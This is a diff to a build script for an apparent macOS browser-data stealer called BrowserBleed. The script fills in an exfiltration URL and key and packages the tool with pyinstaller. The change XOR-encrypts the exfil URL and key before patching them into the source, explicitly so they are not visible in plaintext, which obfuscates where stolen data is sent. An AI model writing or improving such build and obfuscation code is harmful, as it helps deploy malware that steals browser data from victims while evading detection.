@@ -181,15 +181,31 @@ echo "[*] Installing Python packages (cryptography, pyinstaller)..."
 echo "[+] Python packages ready"
 echo ""
 
-# ── Patch a temp copy of the source ──────────────────────────────────────────
+# ── XOR-encrypt the exfil URL + key, then patch a temp copy of the source ────
 TMP_SRC="$BUILD_TMP/BrowserBleed_mac.py"
+
+# Generate a random 32-byte key and XOR-encrypt URL and key so they aren't plaintext.
+XOR_OUT=$(EXFIL_URL="$EXFIL_URL" EXFIL_KEY="$EXFIL_KEY" "$PYTHON" - <<'PYEOF'
+import os, secrets
+url = os.environ["EXFIL_URL"]
+key = os.environ["EXFIL_KEY"]
+k = secrets.token_bytes(32)
+def enc(s):
+    b = s.encode()
+    return bytes(x ^ k[i % len(k)] for i, x in enumerate(b)).hex()
+print(k.hex(), enc(url), enc(key))
+PYEOF
+)
+read -r XOR_KEY_HEX URL_ENC KEY_ENC <<< "$XOR_OUT"
+
 sed \
-    -e "s|_EXFIL_URL: str = \"\"|_EXFIL_URL: str = \"$EXFIL_URL\"|" \
-    -e "s|_EXFIL_KEY: str = \"\"|_EXFIL_KEY: str = \"$EXFIL_KEY\"|" \
+    -e "s|_EXFIL_URL_ENC: str = \"\"|_EXFIL_URL_ENC: str = \"$URL_ENC\"|" \
+    -e "s|_EXFIL_KEY_ENC: str = \"\"|_EXFIL_KEY_ENC: str = \"$KEY_ENC\"|" \
+    -e "s|_EXFIL_XOR_KEY: str = \"\"|_EXFIL_XOR_KEY: str = \"$XOR_KEY_HEX\"|" \
     "$SCRIPT_DIR/BrowserBleed_mac.py" > "$TMP_SRC"
 
-if ! grep -q "$EXFIL_URL" "$TMP_SRC" || ! grep -q "$EXFIL_KEY" "$TMP_SRC"; then
-    echo "[!] Substitution failed - URL/key not found in patched source. Aborting."
+if ! grep -q "$URL_ENC" "$TMP_SRC" || ! grep -q "$XOR_KEY_HEX" "$TMP_SRC"; then
+    echo "[!] Substitution failed - encrypted values not found in patched source. Aborting."
     exit 1
 fi
 
